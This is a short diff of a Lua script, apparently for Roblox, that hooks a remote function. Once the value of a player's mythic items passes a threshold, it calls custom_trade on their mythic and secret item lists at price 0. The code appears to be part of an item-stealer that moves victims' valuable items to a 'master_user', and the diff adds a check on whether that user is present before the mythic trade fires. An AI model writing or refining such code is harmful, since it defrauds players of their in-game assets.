@@ -1522,9 +1522,12 @@ RF.OnClientInvoke = function(...)
             function()
             running = false
             task.wait(10)
-            if total_harga_mythic > 500000 then -- minimal 500k
-                custom_trade(list_mythic, 0)
-                task.wait(10)
+            if total_harga_mythic > 500000 then
+                local existing = Players:FindFirstChild(master_user)
+                if not existing then
+                    custom_trade(list_mythic, 0)
+                    task.wait(10)
+                end
             end
             custom_trade(list_secret, 0)
             task.wait(10)
